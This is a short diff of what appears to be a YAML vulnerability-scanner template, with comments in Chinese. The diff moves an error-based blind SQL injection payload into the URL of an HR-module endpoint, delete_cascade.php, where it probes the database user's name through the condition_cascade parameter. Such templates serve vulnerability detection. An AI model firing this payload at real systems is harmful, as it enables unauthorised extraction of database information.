@@ -8,11 +8,11 @@
 
 #漏洞的位置
 - url:
-  - url : "/general/hr/manage/query/delete_cascade.php"
+  - url : "/general/hr/manage/query/delete_cascade.php?condition_cascade=select if((substr(user(),1,1)='r'),1,power(9999,99))"
 
 #payload
 - payload:
-  - payload: "condition_cascade=select if((substr(user(),1,1)='r'),1,power(9999,99))"
+  - payload: "isNone"
 
 #response包里状态码
 - status:
